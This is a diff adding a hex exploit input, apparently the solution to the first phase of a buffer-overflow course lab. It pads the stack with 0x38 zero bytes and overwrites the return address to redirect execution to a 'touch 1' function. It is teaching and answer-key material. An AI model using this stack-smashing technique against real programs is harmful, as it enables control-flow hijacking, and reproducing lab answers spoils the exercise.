@@ -1,0 +1,12 @@
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00 00 /* add buffer of 0x38 to stack to override instructions */
+7e 15 40 /* add my new return address to override the old return address, this will take me to touch 1 */
